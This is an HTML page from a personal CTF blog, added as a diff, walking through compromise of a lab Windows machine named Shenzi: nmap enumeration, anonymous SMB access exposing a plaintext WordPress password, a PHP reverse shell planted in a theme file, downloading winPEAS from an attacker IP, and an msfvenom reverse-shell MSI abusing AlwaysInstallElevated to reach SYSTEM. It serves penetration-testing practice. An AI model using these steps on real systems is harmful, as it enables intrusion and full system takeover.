@@ -1,0 +1,149 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-gysqo7gh> <head><meta charset="utf-8"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v5.16.3"><title>Shenzi PGP walkthrough - Your Portfolio</title><meta name="description" content="Target - Shenzi, OS - Windows"><script>
+      (function () {
+        const savedTheme = localStorage.getItem("theme") || "dark";
+        const prefersDark = window.matchMedia(
+          "(prefers-color-scheme: dark)"
+        ).matches;
+        const initialTheme =
+          savedTheme === "system"
+            ? prefersDark
+              ? "dark"
+              : "light"
+            : savedTheme;
+
+        if (initialTheme === "dark") {
+          document.documentElement.classList.add("dark");
+        } else {
+          document.documentElement.classList.remove("dark");
+        }
+      })();
+    </script><script type="module">document.addEventListener("DOMContentLoaded",function(){window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{localStorage.getItem("theme")==="system"&&(e.matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark"))});const t=document.querySelector(".prose");if(t){const e=t.querySelector("h1");e&&e.remove()}});</script><link rel="stylesheet" href="/_astro/about.xvh9vdT6.css">
+<style>html,body{margin:0;padding:0;height:100%;overflow-x:hidden}body{display:flex;flex-direction:column;min-height:100vh}main[data-astro-cid-gysqo7gh]{flex:1}section[data-astro-cid-gysqo7gh][class*=text-gray-700]{margin:0;padding:0;flex-shrink:0}.prose[data-astro-cid-gysqo7gh] h1[data-astro-cid-gysqo7gh]:first-of-type,.prose[data-astro-cid-gysqo7gh]>h1[data-astro-cid-gysqo7gh]:first-child,article[data-astro-cid-gysqo7gh] .prose[data-astro-cid-gysqo7gh] h1[data-astro-cid-gysqo7gh]:first-child{display:none!important}.dot-hexagon-light[data-astro-cid-gysqo7gh]{background-image:radial-gradient(circle,#80808045 1px,transparent 1px),radial-gradient(circle,#80808045 1px,transparent 1px);background-size:24px 41.57px;background-position:0 0,12px 20.78px}.dot-hexagon-dark[data-astro-cid-gysqo7gh]{background-image:radial-gradient(circle,#ffffff35 1px,transparent 1px),radial-gradient(circle,#ffffff35 1px,transparent 1px);background-size:24px 41.57px;background-position:0 0,12px 20.78px}
+</style></head> <body class="bg-white dark:bg-neutral-900 transition-colors duration-300" data-astro-cid-gysqo7gh> <div class="fixed inset-0 z-0 pointer-events-none" data-astro-cid-gysqo7gh> <div class="absolute inset-0 -z-10 dot-hexagon-light dark:dot-hexagon-dark" data-astro-cid-gysqo7gh></div> <div class="absolute inset-0 bg-[radial-gradient(ellipse_80%_80%_at_50%_50%,transparent_0%,rgba(255,255,255,0.5)_60%,rgba(255,255,255,0.9)_85%,white_100%)] dark:bg-[radial-gradient(ellipse_80%_80%_at_50%_50%,transparent_0%,rgba(23,23,23,0.5)_60%,rgba(23,23,23,0.9)_85%,rgb(23,23,23)_100%)] -z-10" data-astro-cid-gysqo7gh></div> <div class="absolute left-0 right-0 top-0 -z-10 m-auto h-[1200px] w-[1200px] rounded-full bg-neutral-400 opacity-10 blur-[100px]" data-astro-cid-gysqo7gh></div> </div> <main class="flex-1 relative z-10" data-astro-cid-gysqo7gh> <!-- Navigation Bar Component --><nav class="relative z-50"> <div class="container mx-auto px-4 sm:px-6 lg:px-8"> <div class="flex items-center justify-between h-16"> <a href="/" class="text-xl font-bold text-neutral-700 hover:text-neutral-400 dark:text-neutral-300 dark:hover:text-neutral-100 transition-colors"></a> <div class="flex items-center space-x-6"> <a href="/" class="text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors">Home</a> <a href="/posts/" class="text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors">CTF</a> <!-- <a
+          href="/projects/"
+          class="text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors"
+          >Projects</a
+        > --> <a href="/about/" class="text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors">About</a> <button id="theme-toggle" class="p-2 rounded-full text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors" title="Toggle theme"> <svg class="w-5 h-5 theme-icon-light hidden" fill="currentColor" viewBox="0 0 20 20"> <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z"></path> </svg> <svg class="w-5 h-5 theme-icon-dark hidden" fill="currentColor" viewBox="0 0 20 20"> <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path> </svg> </button> </div> </div> </div> </nav> <script type="module">document.addEventListener("DOMContentLoaded",function(){const t=document.getElementById("theme-toggle"),n=t.querySelector(".theme-icon-light"),c=t.querySelector(".theme-icon-dark");function o(e){e?(n.classList.add("hidden"),c.classList.remove("hidden")):(n.classList.remove("hidden"),c.classList.add("hidden"))}const s=document.documentElement.classList.contains("dark");o(s),t.addEventListener("click",function(){const e=document.documentElement.classList.contains("dark"),d=e?"light":"dark";document.documentElement.classList.toggle("dark"),o(!e),localStorage.setItem("theme",d)})});</script> <article class="relative z-20 w-[896px] mx-auto mt-24 mb-12 px-7 lg:px-0" data-astro-cid-gysqo7gh> <header class="text-center" data-astro-cid-gysqo7gh> <h1 class="text-2xl font-bold tracking-tight text-neutral-900 dark:text-neutral-100 sm:text-3xl lg:text-4xl mb-1.5" data-astro-cid-gysqo7gh> Shenzi PGP walkthrough </h1> <div class="flex items-center justify-center gap-4 text-sm text-neutral-600 dark:text-neutral-400 mb-1.5" data-astro-cid-gysqo7gh> <time datetime="2025-12-12T00:00:00.000Z" data-astro-cid-gysqo7gh> December 12, 2025 </time> <span data-astro-cid-gysqo7gh>•</span> <span data-astro-cid-gysqo7gh>10 min read</span> </div> </header> <p class="text-lg text-neutral-600 dark:text-neutral-400 mb-16 text-center" data-astro-cid-gysqo7gh> Target - Shenzi, OS - Windows </p> <div class="prose prose-neutral dark:prose-invert max-w-none" data-astro-cid-gysqo7gh> <h1 id="enum"><em>Enum</em></h1>
+<p>Gather information about the target  network, systems, services, open ports with nmap</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nmap -sVC -n -T4 --open -Pn -oN Shenzi-nmap 192.168.201.55</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Nmap scan report for 192.168.201.55</span></span>
+<span class="line"><span>Host is up (0.33s latency).</span></span>
+<span class="line"><span>Not shown: 993 closed tcp ports (reset)</span></span>
+<span class="line"><span>PORT     STATE SERVICE       VERSION</span></span>
+<span class="line"><span>21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta</span></span>
+<span class="line"><span>| ftp-syst: </span></span>
+<span class="line"><span>|_  SYST: UNIX emulated by FileZilla</span></span>
+<span class="line"><span>80/tcp   open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</span></span>
+<span class="line"><span>|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6</span></span>
+<span class="line"><span>| http-title: Welcome to XAMPP</span></span>
+<span class="line"><span>|_Requested resource was http://192.168.201.55/dashboard/</span></span>
+<span class="line"><span>135/tcp  open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span></span>
+<span class="line"><span>443/tcp  open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</span></span>
+<span class="line"><span>| ssl-cert: Subject: commonName=localhost</span></span>
+<span class="line"><span>| Not valid before: 2009-11-10T23:48:47</span></span>
+<span class="line"><span>|_Not valid after:  2019-11-08T23:48:47</span></span>
+<span class="line"><span>| http-title: Welcome to XAMPP</span></span>
+<span class="line"><span>|_Requested resource was https://192.168.201.55/dashboard/</span></span>
+<span class="line"><span>| tls-alpn: </span></span>
+<span class="line"><span>|_  http/1.1</span></span>
+<span class="line"><span>|_ssl-date: TLS randomness does not represent time</span></span>
+<span class="line"><span>|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6</span></span>
+<span class="line"><span>445/tcp  open  microsoft-ds?</span></span>
+<span class="line"><span>3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)</span></span>
+<span class="line"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Host script results:</span></span>
+<span class="line"><span>|_clock-skew: -25s</span></span>
+<span class="line"><span>| smb2-security-mode: </span></span>
+<span class="line"><span>|   3:1:1: </span></span>
+<span class="line"><span>|_    Message signing enabled but not required</span></span>
+<span class="line"><span>| smb2-time: </span></span>
+<span class="line"><span>|   date: 2025-12-19T15:18:10</span></span>
+<span class="line"><span>|_  start_date: N/A</span></span>
+<span class="line"><span></span></span></code></pre>
+<p><code>/dashboard/</code>  has the default XAMPP page with backend language as PHP in use. That is a good point to be noted. We might craft a PHP based reverse shell.</p>
+<p><img src="/assets/images/Shenzi/Xampp-dashboard.png" alt="XAMPP"></p>
+<p><code>php-info</code> Looking for <code>document-root</code>  the path was set <code>C:xampp/htdocs/</code>  which is the root directory for the web application being hosted.</p>
+<p>Note: The php-info page usually should not be kept accessible for public.</p>
+<p><img src="/assets/images/Shenzi/doc-root.png" alt="docrt"></p>
+<hr>
+<h1 id="initial-access"><em>Initial Access</em></h1>
+<p>Nmap scan results revealed that SMB port is open</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>smb2-security-mode: </span></span>
+<span class="line"><span>|   3:1:1: </span></span>
+<span class="line"><span>|_    Message signing enabled but not required</span></span></code></pre>
+<p>Tried to log-in with no creds using the <code>-N</code> parameter in smbclient. First tried listing the available shares. Found a shared named <code>Shenzi</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span> smbclient  -L \\\\192.168.201.55\\ -N                               </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        Sharename       Type      Comment</span></span>
+<span class="line"><span>        ---------       ----      -------</span></span>
+<span class="line"><span>        IPC$            IPC       Remote IPC</span></span>
+<span class="line"><span>        Shenzi          Disk      </span></span>
+<span class="line"><span>Reconnecting with SMB1 for workgroup listing.</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Further listed the Shenzi shared and found some files in which the <code>passwords.txt</code> looked interesting and a valuable lead.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>└─$ smbclient  \\\\192.168.201.55\\shenzi -N</span></span>
+<span class="line"><span>Try "help" to get a list of possible commands.</span></span>
+<span class="line"><span>smb: \> ls</span></span>
+<span class="line"><span>  .                                   D        0  Thu May 28 08:45:09 2020</span></span>
+<span class="line"><span>  ..                                  D        0  Thu May 28 08:45:09 2020</span></span>
+<span class="line"><span>  passwords.txt                       A      894  Thu May 28 08:45:09 2020</span></span>
+<span class="line"><span>  readme_en.txt                       A     7367  Thu May 28 08:45:09 2020</span></span>
+<span class="line"><span>  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 08:45:09 2020</span></span>
+<span class="line"><span>  why.tmp                             A      213  Thu May 28 08:45:09 2020</span></span>
+<span class="line"><span>  xampp-control.ini                   A      178  Thu May 28 08:45:09 2020</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>                12941823 blocks of size 4096. 6420014 blocks available</span></span>
+<span class="line"><span>smb: \> </span></span>
+<span class="line"><span></span></span></code></pre>
+<p>After downloading all the files form the share viewed the passwords.txt file contents.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>└─$ cat creds                          </span></span>
+<span class="line"><span>wpadmin - FeltHeadwallWight357</span></span></code></pre>
+<p>The credentials discovered implied there maybe a <code>Wordpress</code> site in use. That’s another lead now. Fuzzing, sub-domain fuzzing didn’t reveal any interesting pages, directory.</p>
+<p>Tried to access the website with <code>/shenzi</code> to see if such web page exist and it actually turns out to be the Wordpress site being hosted.</p>
+<p>The idea about what if a wordpress site is in just named as <code>Shenzi</code> actually comes from the lead that the earlier discovered open SMB shared was named as <code>Shenzi</code> hence, why not should it be the name of a page too.</p>
+<p><img src="/assets/images/Shenzi/Shenzi-wp-site.png" alt="Shenzi-wp"></p>
+<p>As we have discovered that Wordpress is in use there must be the admin login page which we tried to login with the discovered passwords from the SMB share as the creds belongs to wp-admin. After trying to use the passwords the user name is <code>admin</code> is what worked with the discovered password.</p>
+<p><img src="/assets/images/Shenzi/wp-admin.png" alt="wpadmin"></p>
+<p>After loggin in as WP site’s admin user and going through the pages under Themes > Appearance there are the actual pages like the index.php, 404.php.</p>
+<p>We discovered earlier that the site uses PHP for backend. Tried to modify the contents of index.php with a php based reverse shell and loaded that.</p>
+<p><img src="/assets/images/Shenzi/Themes-page.png" alt="Theme">
+Since we modified the index.php (Main Index Template) page which contains our reverse shell code accessing the page actually loaded the php reverse shell which is a good sign.</p>
+<p><img src="/assets/images/Shenzi/Rev-shell-call.png" alt="Shenzi-wp"></p>
+<p>We have a netcat  listener running at local port.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>rlwrp nc -lnvp 4444</span></span></code></pre>
+<p>use rlwrap for arrow keys funtcionality.</p>
+<p><img src="/assets/images/Shenzi/shenzi-shell.png" alt="Shenzi-shell"></p>
+<p>Got the reverse shell connected  as Shenzi user</p>
+<p>Executed <code>whoami, whoami /priv</code> the  current user is Shenzi and no interesting privileges were found.</p>
+<p>Got the local flag at  <code>C:/Users/Shenzi/Desktop/local.txt</code></p>
+<p><img src="/assets/images/Shenzi/local.png" alt="Local"></p>
+<hr>
+<h1 id="privilege-escalation"><em>Privilege Escalation</em></h1>
+<p>Further transferred Winpeas  to target using iwr command to enumerate internally.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>iwr -uri http://192.168.45.179/wp.exe -o wp.exe</span></span>
+<span class="line"><span></span></span></code></pre>
+<p><img src="/assets/images/Shenzi/trans-tools.png" alt="Transtools"></p>
+<p>Renamed winpeas.exe as wp.exe</p>
+<p>After executing winpeas analyzed the discovered information and the interesting thing is <code>AlwaysInstallElevated</code> has been set to 1 that means we might be able to craft a malicious .msi file and execute it get another shell as NT System user .</p>
+<p><img src="/assets/images/Shenzi/Winpeas.png" alt=""></p>
+<p>Created a msi file with msfvenom which is a reverse shell that connects back to local as system user / NT.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span> msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi rev.msi</span></span></code></pre>
+<p>Transferred the .msi file to the target system and executed that.</p>
+<p><img src="/assets/images/Shenzi/msi-exec.png" alt="Shenzi-wp"></p>
+<p>Having a netcat listener listening at 4444 at local. Got the shell connected as NT-AUTHORITY\SYSTEM</p>
+<p><img src="/assets/images/Shenzi/NT.png" alt=""></p>
+<p>Got the proof.txt under</p>
+<p><img src="/assets/images/Shenzi/proof.png" alt=""></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>									Target compromised - |^| ^ ( |&#x3C; 3 D</span></span></code></pre> </div> </article> </main> <!-- Footer Component --><section class="relative text-gray-700 min-h-[60px]"> <div class="container mx-auto px-7 max-w-7xl
+           flex justify-center items-end"> <div class="flex items-center space-x-3
+             absolute bottom-0 pb-2
+             text-neutral-700 dark:text-neutral-300"> <a href="/posts" class="group flex items-center space-x-1.5 font-semibold"> <span class="text-xl -translate-y-0.5
+                 group-hover:scale-[1.1]
+                 transition-transform duration-300 ease-in-out">
+Dragon-CTF
+</span> <span class="-translate-y-0.5">Decoder</span> </a> <span class="opacity-60">|</span> <p class="text-sm">
+© 2025 All rights reserved.
+</p> </div> </div> </section> </body></html>
